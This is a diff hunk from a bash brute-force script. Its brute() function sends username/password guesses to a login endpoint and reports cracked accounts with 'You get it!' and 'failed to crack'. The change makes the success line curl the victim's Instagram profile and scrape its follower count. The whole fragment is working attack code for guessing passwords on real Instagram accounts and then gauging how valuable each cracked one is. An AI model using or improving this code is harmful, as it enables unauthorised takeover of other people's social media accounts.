@@ -104,7 +104,7 @@ function brute(){
                     -d "username=${i}&password=${pass}")
                     login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                     if [[ $login =~ "true" ]]; then
-                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(grep -o '<meta property="og:description" content=".*' | cut -d '"' -f4 | cut -d " " -f1)
+                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(cURL -sXGET "https://instagram.com/${i}/" | grep -o '<meta property="og:description" content=".*' | cut -d '"' -f4 | cut -d " " -f1)
                         elif [[ $login =~ "false" ]]; then
                                     echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
                             elif [[ $url =~ "checkpoint_required" ]]; then
